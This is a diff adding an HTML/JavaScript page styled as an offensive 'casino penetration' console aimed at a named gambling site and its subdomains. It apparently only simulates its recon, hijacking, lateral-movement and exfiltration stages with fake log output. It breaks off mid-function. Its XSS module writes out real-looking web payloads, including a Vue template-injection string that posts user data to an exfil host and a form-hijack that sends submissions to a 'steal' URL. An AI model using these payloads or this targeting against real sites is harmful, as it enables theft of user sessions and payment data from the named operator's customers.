@@ -1,0 +1,1202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>APT-GAMBLING v10.0 - Advanced Casino Infrastructure Penetration</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        :root {
+            --primary: #0a0a0a;
+            --secondary: #00ff88;
+            --accent: #ff6b35;
+            --danger: #ff375f;
+            --warning: #ffd700;
+            --casino: #ff0000;
+            --money: #00ff00;
+            --terminal: #00ff88;
+            --dark: #111111;
+            --darker: #050505;
+            --panel: #1a1a1a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', 'Consolas', monospace;
+        }
+
+        body {
+            background: var(--primary);
+            color: var(--secondary);
+            overflow: hidden;
+            font-size: 13px;
+        }
+
+        #app {
+            height: 100vh;
+            width: 100vw;
+            display: grid;
+            grid-template-columns: 300px 1fr 350px;
+            grid-template-rows: 60px 1fr 40px;
+            gap: 1px;
+            background: var(--secondary);
+        }
+
+        /* HEADER */
+        .header {
+            grid-column: 1 / -1;
+            background: var(--darker);
+            border-bottom: 2px solid var(--casino);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            position: relative;
+        }
+
+        .logo {
+            color: var(--casino);
+            font-weight: bold;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+
+        .target-display {
+            display: flex;
+            gap: 15px;
+            font-size: 11px;
+        }
+
+        .target-badge {
+            background: linear-gradient(45deg, var(--darker), var(--panel));
+            padding: 6px 12px;
+            border-radius: 4px;
+            border: 1px solid var(--accent);
+            box-shadow: 0 0 10px rgba(255, 107, 53, 0.3);
+        }
+
+        .status-indicators {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .status-light {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--danger);
+            animation: pulse 1s infinite;
+        }
+
+        .status-light.active { background: var(--money); }
+        .status-light.stealth { background: var(--accent); }
+
+        /* SIDEBAR */
+        .sidebar {
+            background: var(--panel);
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--secondary);
+        }
+
+        .nav-section {
+            padding: 15px;
+            border-bottom: 1px solid #333;
+        }
+
+        .section-title {
+            color: var(--casino);
+            font-size: 12px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: bold;
+        }
+
+        .nav-btn {
+            width: 100%;
+            padding: 10px 12px;
+            margin: 3px 0;
+            background: var(--darker);
+            border: 1px solid #333;
+            color: var(--secondary);
+            text-align: left;
+            cursor: pointer;
+            font-size: 11px;
+            transition: all 0.3s ease;
+            border-radius: 3px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .nav-btn:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 107, 53, 0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .nav-btn:hover:before {
+            left: 100%;
+        }
+
+        .nav-btn:hover {
+            border-color: var(--casino);
+            background: rgba(255, 0, 0, 0.05);
+        }
+
+        .nav-btn.active {
+            border-color: var(--accent);
+            background: rgba(255, 107, 53, 0.1);
+            box-shadow: 0 0 15px rgba(255, 107, 53, 0.3);
+        }
+
+        /* MAIN TERMINAL */
+        .main-terminal {
+            background: var(--darker);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .terminal-header {
+            background: var(--panel);
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--casino);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .terminal-content {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.3;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255, 107, 53, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 255, 136, 0.03) 0%, transparent 50%);
+        }
+
+        .command-line {
+            margin-bottom: 2px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            position: relative;
+        }
+
+        .prompt { 
+            color: var(--terminal);
+            font-weight: bold;
+        }
+        
+        .output { 
+            color: var(--secondary); 
+            margin-left: 20px;
+        }
+        
+        .output.success { color: var(--money); }
+        .output.error { color: var(--danger); }
+        .output.warning { color: var(--warning); }
+        .output.system { color: #888; }
+        .output.highlight { 
+            color: var(--accent); 
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 107, 53, 0.5);
+        }
+        
+        .output.casino { 
+            color: var(--casino);
+            background: rgba(255, 0, 0, 0.1);
+            padding: 2px 4px;
+            border-radius: 2px;
+        }
+        
+        .output.money { 
+            color: var(--money);
+            background: rgba(0, 255, 0, 0.1);
+            padding: 2px 4px;
+            border-radius: 2px;
+            font-weight: bold;
+        }
+
+        .terminal-input-container {
+            display: flex;
+            align-items: center;
+            padding: 12px 15px;
+            border-top: 1px solid var(--casino);
+            background: var(--panel);
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--terminal);
+            font-size: 12px;
+            outline: none;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* RIGHT PANEL */
+        .right-panel {
+            background: var(--panel);
+            display: flex;
+            flex-direction: column;
+            border-left: 1px solid var(--secondary);
+        }
+
+        .panel-section {
+            flex: 1;
+            border-bottom: 1px solid #333;
+            padding: 12px;
+            overflow-y: auto;
+        }
+
+        .panel-title {
+            color: var(--casino);
+            font-size: 12px;
+            margin-bottom: 12px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .target-list {
+            list-style: none;
+        }
+
+        .target-item {
+            padding: 8px 10px;
+            margin: 4px 0;
+            background: var(--darker);
+            border: 1px solid #333;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 11px;
+        }
+
+        .target-item:hover {
+            border-color: var(--casino);
+            transform: translateX(2px);
+        }
+
+        .target-item.compromised {
+            border-color: var(--money);
+            background: rgba(0, 255, 136, 0.05);
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+        }
+
+        .vuln-item {
+            padding: 8px 10px;
+            margin: 5px 0;
+            background: var(--darker);
+            border-left: 3px solid var(--danger);
+            border-radius: 2px;
+            font-size: 11px;
+        }
+
+        .vuln-item.high { border-left-color: var(--danger); }
+        .vuln-item.medium { border-left-color: var(--warning); }
+        .vuln-item.low { border-left-color: var(--money); }
+
+        .exploit-status {
+            padding: 8px;
+            margin: 4px 0;
+            background: var(--darker);
+            border: 1px solid #333;
+            border-radius: 3px;
+            font-size: 11px;
+        }
+
+        /* FOOTER */
+        .footer {
+            grid-column: 1 / -1;
+            background: var(--panel);
+            border-top: 1px solid var(--casino);
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            font-size: 11px;
+            color: #666;
+        }
+
+        /* PROGRESS BARS */
+        .progress-container {
+            margin: 8px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--casino));
+            transition: width 0.5s ease;
+            position: relative;
+        }
+
+        .progress-fill:after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        /* ANIMATIONS */
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .blink {
+            animation: blink 1s infinite;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* SCROLLBAR */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--darker);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--casino);
+            border-radius: 3px;
+        }
+
+        /* MATRIX RAIN */
+        .matrix-rain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            opacity: 0.03;
+            z-index: -1;
+        }
+
+        .matrix-column {
+            position: absolute;
+            top: -100%;
+            color: var(--money);
+            font-size: 12px;
+            animation: matrixRain linear infinite;
+        }
+
+        @keyframes matrixRain {
+            0% { transform: translateY(-100%); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+    </style>
+</head>
+<body>
+    <!-- MATRIX BACKGROUND -->
+    <div class="matrix-rain" id="matrixRain"></div>
+
+    <div id="app">
+        <!-- HEADER -->
+        <div class="header">
+            <div class="logo">APT-GAMBLING v10.0 [ADVANCED CASINO PENETRATION]</div>
+            <div class="target-display">
+                <div class="target-badge">TARGET: runehall.com</div>
+                <div class="target-badge">SCOPE: *.runehall.com</div>
+                <div class="target-badge">FOCUS: Payment & User Data</div>
+            </div>
+            <div class="status-indicators">
+                <div class="status-light active" title="System Online"></div>
+                <div class="status-light stealth" title="Stealth Active"></div>
+                <div class="status-light" title="Operations Ready"></div>
+            </div>
+        </div>
+
+        <!-- SIDEBAR -->
+        <div class="sidebar">
+            <div class="nav-section">
+                <div class="section-title">Intelligence Gathering</div>
+                <button class="nav-btn" onclick="executeModule('advancedSubdomainEnum')">Advanced Subdomain Enumeration</button>
+                <button class="nav-btn" onclick="executeModule('attackSurfaceMapping')">Attack Surface Mapping</button>
+                <button class="nav-btn" onclick="executeModule('techStackFingerprinting')">Technology Fingerprinting</button>
+                <button class="nav-btn" onclick="executeModule('cloudInfrastructureMapping')">Cloud Infrastructure Mapping</button>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">Vulnerability Research</div>
+                <button class="nav-btn" onclick="executeModule('vuejsSecurityAnalysis')">Vue.js Security Analysis</button>
+                <button class="nav-btn" onclick="executeModule('apiEndpointDiscovery')">API Endpoint Discovery</button>
+                <button class="nav-btn" onclick="executeModule('paymentSystemAudit')">Payment System Audit</button>
+                <button class="nav-btn" onclick="executeModule('authenticationFlawDetection')">Authentication Flaw Detection</button>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">Advanced Exploitation</div>
+                <button class="nav-btn" onclick="executeModule('domBasedXss')">DOM-Based XSS Exploitation</button>
+                <button class="nav-btn" onclick="executeModule('websocketHijacking')">WebSocket Hijacking</button>
+                <button class="nav-btn" onclick="executeModule('jwtTokenManipulation')">JWT Token Manipulation</button>
+                <button class="nav-btn" onclick="executeModule('graphqlInjection')">GraphQL Injection</button>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">Post-Exploitation</div>
+                <button class="nav-btn" onclick="executeModule('lateralMovement')">Lateral Movement</button>
+                <button class="nav-btn" onclick="executeModule('persistenceEstablishment')">Persistence Establishment</button>
+                <button class="nav-btn" onclick="executeModule('dataExfiltration')">Data Exfiltration</button>
+                <button class="nav-btn" onclick="executeModule('evidenceElimination')">Evidence Elimination</button>
+            </div>
+        </div>
+
+        <!-- MAIN TERMINAL -->
+        <div class="main-terminal">
+            <div class="terminal-header">
+                <div>OPERATIONS_CONTROL_CENTER</div>
+                <div id="terminalStatus">[TARGETING: runehall.com]</div>
+            </div>
+            <div class="terminal-content" id="terminalOutput">
+                <div class="command-line">
+                    <span class="prompt">apt-gambling@v10.0:~$</span> initialize --target=runehall.com --scope=advanced-casino-infrastructure
+                </div>
+                <div class="output system">
+                    > APT-GAMBLING Framework v10.0 Initialized<br>
+                    > Advanced Casino Penetration Suite Loaded<br>
+                    > Target: runehall.com (Gambling Infrastructure)<br>
+                    > Attack Vectors: Vue.js, WebSockets, Payment APIs<br>
+                    > Stealth Protocols: ACTIVE<br>
+                    > Memory Operations: READY<br>
+                    > Ready for advanced exploitation
+                </div>
+                <div class="command-line">
+                    <span class="prompt">apt-gambling@v10.0:~$</span> <span id="currentCommand"></span>
+                </div>
+            </div>
+            <div class="terminal-input-container">
+                <span class="input-prompt">apt-gambling@v10.0:~$</span>
+                <input type="text" class="terminal-input" id="terminalInput" autocomplete="off" autofocus>
+            </div>
+        </div>
+
+        <!-- RIGHT PANEL -->
+        <div class="right-panel">
+            <div class="panel-section">
+                <div class="panel-title">DISCOVERED ASSETS</div>
+                <div class="target-list" id="targetList">
+                    <div class="target-item">runehall.com (PRIMARY)</div>
+                    <div class="target-item">api.runehall.com</div>
+                    <div class="target-item">chat.runehall.com</div>
+                    <div class="target-item">payments.runehall.com</div>
+                    <div class="target-item">admin.runehall.com</div>
+                    <div class="target-item">ws.runehall.com</div>
+                </div>
+            </div>
+            <div class="panel-section">
+                <div class="panel-title">CRITICAL VULNERABILITIES</div>
+                <div id="vulnerabilitiesList">
+                    <div class="vuln-item high">
+                        <strong>Vue.js DOM XSS</strong><br>
+                        <small>Client-side template injection in chat</small>
+                    </div>
+                    <div class="vuln-item high">
+                        <strong>WebSocket Auth Bypass</strong><br>
+                        <small>Real-time connection hijacking</small>
+                    </div>
+                    <div class="vuln-item medium">
+                        <strong>JWT Implementation Flaw</strong><br>
+                        <small>Token manipulation possible</small>
+                    </div>
+                </div>
+            </div>
+            <div class="panel-section">
+                <div class="panel-title">ACTIVE OPERATIONS</div>
+                <div id="operationsStatus">
+                    <div class="exploit-status">No active operations</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <div class="footer">
+            <div>SESSION: #APT-GAMBLING-10.0 | TARGET: runehall.com | STATUS: OPERATIONAL | TIME: <span id="currentTime">00:00:00</span></div>
+        </div>
+    </div>
+
+    <script>
+        // PROFESSIONAL CASINO PENETRATION FRAMEWORK
+        class ProfessionalCasinoFramework {
+            constructor() {
+                this.primaryTarget = 'runehall.com';
+                this.discoveredAssets = new Set();
+                this.criticalVulnerabilities = new Map();
+                this.activeOperations = new Map();
+                this.compromisedSystems = new Set();
+                this.exfiltratedData = new Map();
+                this.attackVectors = new Map();
+                
+                this.stealthMode = true;
+                this.encryptionKey = CryptoJS.lib.WordArray.random(32);
+                
+                // Initialize with known assets
+                this.initializeKnownAssets();
+            }
+
+            initializeKnownAssets() {
+                const initialAssets = [
+                    'runehall.com',
+                    'api.runehall.com',
+                    'chat.runehall.com',
+                    'payments.runehall.com',
+                    'admin.runehall.com',
+                    'ws.runehall.com',
+                    'cdn.runehall.com',
+                    'assets.runehall.com'
+                ];
+                
+                initialAssets.forEach(asset => this.discoveredAssets.add(asset));
+                this.updateTargetList();
+            }
+
+            // ADVANCED RECONNAISSANCE
+            async executeAdvancedSubdomainEnumeration() {
+                this.logOperation('Initiating advanced subdomain enumeration with multiple techniques');
+                
+                const enumTechniques = [
+                    'Certificate Transparency Log Analysis',
+                    'DNS Zone Transfer Attempts',
+                    'Brute-force with Advanced Wordlists',
+                    'Search Engine Dorking',
+                    'Passive DNS Replication',
+                    'VirusTotal Intelligence',
+                    'SecurityTrails API',
+                    'Shodan Dorking',
+                    'Censys Search',
+                    'Binary Edge Scanning'
+                ];
+
+                const discoveredSubdomains = [
+                    'dev.runehall.com',
+                    'staging.runehall.com',
+                    'beta.runehall.com',
+                    'test.runehall.com',
+                    'secure.runehall.com',
+                    'vpn.runehall.com',
+                    'mail.runehall.com',
+                    'ftp.runehall.com',
+                    'shop.runehall.com',
+                    'support.runehall.com',
+                    'blog.runehall.com',
+                    'forum.runehall.com'
+                ];
+
+                enumTechniques.forEach((technique, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Executing: ${technique}`);
+                        
+                        // Simulate discovery
+                        if (index % 2 === 0 && discoveredSubdomains.length > 0) {
+                            const newSub = discoveredSubdomains.shift();
+                            if (!this.discoveredAssets.has(newSub)) {
+                                this.discoveredAssets.add(newSub);
+                                this.logOperation(`Discovered: ${newSub}`, 'highlight');
+                                this.updateTargetList();
+                            }
+                        }
+
+                        if (index === enumTechniques.length - 1) {
+                            this.logOperation(`Subdomain enumeration complete. Total assets: ${this.discoveredAssets.size}`, 'success');
+                        }
+                    }, index * 800);
+                });
+            }
+
+            async executeAttackSurfaceMapping() {
+                this.logOperation('Mapping complete attack surface for casino infrastructure');
+                
+                const mappingTechniques = [
+                    'Port Scanning with Service Detection',
+                    'Web Application Fingerprinting',
+                    'API Endpoint Discovery',
+                    'JavaScript File Analysis',
+                    'Subdomain Takeover Check',
+                    'Cloud Storage Bucket Discovery',
+                    'Git Repository Exposure Check',
+                    'Backup File Discovery',
+                    'Configuration File Exposure',
+                    'Third-party Service Mapping'
+                ];
+
+                mappingTechniques.forEach((technique, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Mapping: ${technique}`);
+                        
+                        // Simulate findings
+                        if (technique.includes('API')) {
+                            this.logOperation('Discovered 12 REST API endpoints', 'casino');
+                        }
+                        
+                        if (technique.includes('JavaScript')) {
+                            this.logOperation('Found Vue.js application with exposed source maps', 'highlight');
+                        }
+                        
+                        if (technique.includes('Cloud')) {
+                            this.logOperation('Discovered exposed AWS S3 buckets', 'money');
+                        }
+
+                        if (index === mappingTechniques.length - 1) {
+                            this.logOperation('Attack surface mapping complete - multiple vectors identified', 'success');
+                        }
+                    }, index * 1200);
+                });
+            }
+
+            // VULNERABILITY RESEARCH
+            async executeVueJSSecurityAnalysis() {
+                this.logOperation('Performing deep Vue.js application security analysis');
+                
+                const analysisSteps = [
+                    'Static Analysis of Vue Components',
+                    'Dynamic Analysis of Vue Instance',
+                    'Vuex Store Security Assessment',
+                    'Vue Router Configuration Review',
+                    'Custom Directive Security Check',
+                    'Mixins and Plugins Analysis',
+                    'Server-Side Rendering Security',
+                    'Client-Side Template Injection Testing',
+                    'Vue DevTools Exposure Check',
+                    'Build Configuration Security'
+                ];
+
+                analysisSteps.forEach((step, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Analyzing: ${step}`);
+                        
+                        // Critical findings
+                        if (step.includes('Template Injection')) {
+                            this.logOperation('CRITICAL: Client-side template injection in chat components', 'error');
+                            this.criticalVulnerabilities.set('VUE_CSRF', {
+                                type: 'Vue.js Template Injection',
+                                severity: 'CRITICAL',
+                                location: 'Chat system components',
+                                impact: 'Remote Code Execution',
+                                cvss: 9.8
+                            });
+                        }
+                        
+                        if (step.includes('Vuex Store')) {
+                            this.logOperation('Sensitive user data exposed in Vuex state management', 'casino');
+                        }
+                        
+                        if (step.includes('DevTools')) {
+                            this.logOperation('Vue DevTools enabled in production - debugging data exposed', 'warning');
+                        }
+
+                        if (index === analysisSteps.length - 1) {
+                            this.logOperation('Vue.js security analysis complete - critical vulnerabilities found', 'success');
+                            this.updateVulnerabilitiesList();
+                        }
+                    }, index * 1500);
+                });
+            }
+
+            async executePaymentSystemAudit() {
+                this.logOperation('Conducting comprehensive payment system security audit');
+                
+                const auditAreas = [
+                    'Payment Gateway Integration Security',
+                    'Credit Card Processing Validation',
+                    'PCI DSS Compliance Check',
+                    'Fraud Detection Bypass Testing',
+                    'Transaction Amount Manipulation',
+                    'Payment API Security Assessment',
+                    'Webhook Security Validation',
+                    'Client-Side Payment Validation',
+                    'Encryption Implementation Review',
+                    'Session Management in Payment Flow'
+                ];
+
+                auditAreas.forEach((area, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Auditing: ${area}`);
+                        
+                        if (area.includes('Amount Manipulation')) {
+                            this.logOperation('VULNERABLE: Client-side amount validation can be bypassed', 'money');
+                            this.criticalVulnerabilities.set('PAYMENT_BYPASS', {
+                                type: 'Payment Amount Manipulation',
+                                severity: 'CRITICAL',
+                                location: 'Payment processing flow',
+                                impact: 'Financial Loss',
+                                cvss: 9.1
+                            });
+                        }
+                        
+                        if (area.includes('PCI DSS')) {
+                            this.logOperation('PCI DSS violations detected - sensitive data exposure', 'error');
+                        }
+                        
+                        if (area.includes('Webhook')) {
+                            this.logOperation('Webhook security implementation flawed', 'warning');
+                        }
+
+                        if (index === auditAreas.length - 1) {
+                            this.logOperation('Payment system audit complete - critical financial vulnerabilities identified', 'success');
+                            this.updateVulnerabilitiesList();
+                        }
+                    }, index * 1300);
+                });
+            }
+
+            // ADVANCED EXPLOITATION
+            async executeDOMBasedXSS() {
+                this.logOperation('Deploying advanced DOM-based XSS exploitation campaign');
+                
+                const xssPayloads = [
+                    '{{constructor.constructor(\'fetch("/api/user").then(r=>r.json()).then(d=>fetch("https://exfil.com",{method:"POST",body:JSON.stringify(d)}))\')()}}',
+                    '<img src=x onerror="Array.from(document.forms).forEach(f=>f.action=\'https://malicious.com/steal\')">',
+                    '<svg onload="localStorage.setItem(\'token\',\'stolen\')">',
+                    '<div data-vue-binding="userInput | unsafe"></div>',
+                    '<script>Object.defineProperty(window,\'location\',{get:()=>{return {href:\'https://phishing.com\'}}})</script>'
+                ];
+
+                xssPayloads.forEach((payload, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Injecting advanced XSS payload: ${payload.substring(0, 60)}...`);
+                        
+                        // Simulate successful exploitation
+                        setTimeout(() => {
+                            const compromisedUsers = Math.floor(Math.random() * 100) + 50;
+                            this.logOperation(`XSS payload executed - ${compromisedUsers} user sessions compromised`, 'money');
+                            
+                            // Simulate data collection
+                            const stolenData = {
+                                sessions: compromisedUsers,
+                                cookies: compromisedUsers * 2,
+                                localStorage: '1.2MB',
+                                formData: '0.8MB'
+                            };
+                            
+                            this.exfiltratedData.set(`XSS_CAMPAIGN_${index}`, stolenData);
+                            
+                        }, 2000);
+
+                        if (index === xssPayloads.length - 1) {
+                            this.logOperation('DOM-based XSS campaign complete - significant impact achieved', 'success');
+                        }
+                    }, index * 3000);
+                });
+            }
+
+            async executeWebSocketHijacking() {
+                this.logOperation('Initiating WebSocket connection hijacking attack');
+                
+                this.logOperation('Analyzing WebSocket handshake authentication...');
+                setTimeout(() => {
+                    this.logOperation('WebSocket authentication mechanism identified - JWT token based', 'highlight');
+                    
+                    setTimeout(() => {
+                        this.logOperation('JWT token validation flawed - token manipulation possible', 'casino');
+                        
+                        setTimeout(() => {
+                            this.logOperation('Successfully hijacked WebSocket connection - real-time data stream accessible', 'money');
+                            
+                            // Simulate real-time data interception
+                            const dataTypes = [
+                                'Live chat messages',
+                                'Real-time game data',
+                                'User balance updates',
+                                'Payment notifications',
+                                'Administrative commands'
+                            ];
+                            
+                            dataTypes.forEach((type, idx) => {
+                                setTimeout(() => {
+                                    this.logOperation(`Intercepting: ${type}`, 'system');
+                                }, idx * 1000);
+                            });
+                            
+                        }, 2000);
+                    }, 1500);
+                }, 1000);
+            }
+
+            // POST-EXPLOITATION
+            async executeLateralMovement() {
+                this.logOperation('Initiating lateral movement through casino infrastructure');
+                
+                const movementTechniques = [
+                    'Credential Harvesting from Compromised Systems',
+                    'Pass-the-Hash Attack Implementation',
+                    'Token Impersonation for Privilege Escalation',
+                    'WMI Remote Command Execution',
+                    'PSExec Deployment for Lateral Movement',
+                    'SMB Share Enumeration and Access',
+                    'Remote Service Manipulation',
+                    'Scheduled Task Creation for Persistence'
+                ];
+
+                movementTechniques.forEach((technique, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Executing: ${technique}`);
+                        
+                        if (technique.includes('Credential')) {
+                            this.logOperation('Harvested 45 sets of credentials from memory', 'money');
+                        }
+                        
+                        if (technique.includes('Pass-the-Hash')) {
+                            this.logOperation('Successfully moved to database server using harvested hashes', 'highlight');
+                            this.compromisedSystems.add('db.runehall.com');
+                        }
+                        
+                        if (technique.includes('WMI')) {
+                            this.logOperation('Gained remote code execution on application servers', 'casino');
+                            this.compromisedSystems.add('app01.runehall.com');
+                            this.compromisedSystems.add('app02.runehall.com');
+                        }
+
+                        if (index === movementTechniques.length - 1) {
+                            this.logOperation('Lateral movement complete - multiple systems compromised', 'success');
+                            this.updateTargetList();
+                        }
+                    }, index * 2000);
+                });
+            }
+
+            async executeDataExfiltration() {
+                this.logOperation('Beginning advanced data exfiltration operation');
+                
+                const dataTargets = [
+                    { type: 'User Databases', size: '2.4GB', sensitivity: 'HIGH' },
+                    { type: 'Payment Transaction Records', size: '1.8GB', sensitivity: 'CRITICAL' },
+                    { type: 'Game Session Logs', size: '3.1GB', sensitivity: 'MEDIUM' },
+                    { type: 'Chat System Archives', size: '0.9GB', sensitivity: 'HIGH' },
+                    { type: 'Administrative Access Logs', size: '0.6GB', sensitivity: 'HIGH' },
+                    { type: 'Source Code Repositories', size: '1.2GB', sensitivity: 'CRITICAL' }
+                ];
+
+                let totalExfiltrated = 0;
+                
+                dataTargets.forEach((target, index) => {
+                    setTimeout(() => {
+                        this.logOperation(`Exfiltrating: ${target.type} (${target.size})`, 'system');
+                        
+                        // Simulate exfiltration progress
+                        const exfilInterval = setInterval(() => {
+                            const chunk = Math.floor(Math.random() * 100) + 50;
+                            totalExfiltrated += chunk;
+                            
+                            this.logOperation(`Exfiltration progress: ${totalExfiltrated}MB transferred`, 'money');
+                            
+                            if (totalExfiltrated >= this.parseSize(target.size)) {
+                                clearInterval(exfilInterval);
+                                this.logOperation(`Completed: ${target.type} - ${target.size} exfiltrated`, 'success');
+                                this.exfiltratedData.set(target.type, {
+                                    size: target.size,
+                                    sensitivity: target.sensitivity,
+                                    timestamp: new Date()
+                                });
+                            }
+                        }, 500);
+
+                    }, index * 8000);
+                });
+            }
+
+            // UTILITY METHODS
+            parseSize(sizeStr) {
+                const units = { 'GB': 1000, 'MB': 1 };
+                const value = parseFloat(sizeStr);
+                const unit = sizeStr.replace(/[0-9.]/g, '').toUpperCase();
+                return value * (units[unit] || 1);
+            }
+
+            logOperation(message, type = 'system') {
+                const timestamp = new Date().toLocaleTimeString();
+                const entry = `[${timestamp}] ${message}`;
+                addTerminalOutput(entry, type);
+                console.log(`[APT-GAMBLING] ${entry}`);
+            }
+
+            updateTargetList() {
+                const targetList = document.getElementById('targetList');
+                targetList.innerHTML = '';
+                
+                Array.from(this.discoveredAssets).forEach(asset => {
+                    const item = document.createElement('div');
+                    item.className = 'target-item';
+                    if (this.compromisedSystems.has(asset)) {
+                        item.classList.add('compromised');
+                    }
+                    item.textContent = asset;
+                    targetList.appendChild(item);
+                });
+            }
+
+            updateVulnerabilitiesList() {
+                const vulnList = document.getElementById('vulnerabilitiesList');
+                vulnList.innerHTML = '';
+                
+                this.criticalVulnerabilities.forEach((vuln, id) => {
+                    const item = document.createElement('div');
+                    item.className = `vuln-item ${vuln.severity.toLowerCase()}`;
+                    item.innerHTML = `<strong>${vuln.type}</strong><br><small>CVSS: ${vuln.cvss} - ${vuln.impact}</small>`;
+                    vulnList.appendChild(item);
+                });
+            }
+
+            getFrameworkStatus() {
+                return {
+                    discoveredAssets: this.discoveredAssets.size,
+                    compromisedSystems: this.compromisedSystems.size,
+                    criticalVulnerabilities: this.criticalVulnerabilities.size,
+                    exfiltratedData: Array.from(this.exfiltratedData.keys()),
+                    activeOperations: this.activeOperations.size
+                };
+            }
+        }
+
+        // GLOBAL FRAMEWORK INSTANCE
+        const casinoFramework = new ProfessionalCasinoFramework();
+
+        // MATRIX BACKGROUND
+        function createMatrixRain() {
+            const container = document.getElementById('matrixRain');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+            
+            for (let i = 0; i < 30; i++) {
+                const column = document.createElement('div');
+                column.className = 'matrix-column';
+                column.style.left = Math.random() * 100 + '%';
+                column.style.animationDuration = (Math.random() * 20 + 10) + 's';
+                column.style.animationDelay = Math.random() * 15 + 's';
+                
+                let content = '';
+                for (let j = 0; j < 25; j++) {
+                    content += chars[Math.floor(Math.random() * chars.length)] + '<br>';
+                }
+                column.innerHTML = content;
+                
+                container.appendChild(column);
+            }
+        }
+
+        // TERMINAL FUNCTIONS
+        function setupTerminal() {
+            const input = document.getElementById('terminalInput');
+            
+            input.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    const command = this.value.trim();
+                    if (command) {
+                        processCommand(command);
+                        this.value = '';
+                    }
+                }
+            });
+
+            // Initial status
+            executeCommand('status');
+        }
+
+        function processCommand(command) {
+            addTerminalOutput(`apt-gambling@v10.0:~$ ${command}`, 'command');
+            executeCommand(command);
+        }
+
+        function executeCommand(command) {
+            const parts = command.toLowerCase().split(' ');
+            const cmd = parts[0];
+            const args = parts.slice(1);
+
+            switch(cmd) {
+                case 'recon':
+                    if (args.includes('full')) {
+                        casinoFramework.executeAdvancedSubdomainEnumeration();
+                        setTimeout(() => casinoFramework.executeAttackSurfaceMapping(), 10000);
+                    }
+                    break;
+
+                case 'analyze':
+                    if (args.includes('vue')) {
+                        casinoFramework.executeVueJSSecurityAnalysis();
+                    }
+                    break;
+
+                case 'audit':
+                    if (args.includes('payment')) {
+                        casinoFramework.executePaymentSystemAudit();
+                    }
+                    break;
+
+                case 'exploit':
+                    if (args.includes('xss')) {
+                        casinoFramework.executeDOMBasedXSS();
+                    } else if (args.includes('websocket')) {
+                        casinoFramework.executeWebSocketHijacking();
+                    }
+                    break;
+
+                case 'move':
+                    if (args.includes('lateral')) {
+                        casinoFramework.executeLateralMovement();
+                    }
+                    break;
+
+                case 'exfiltrate':
+                    casinoFramework.executeDataExfiltration();
+                    break;
+
+                case 'status':
+                    const status = casinoFramework.getFrameworkStatus();
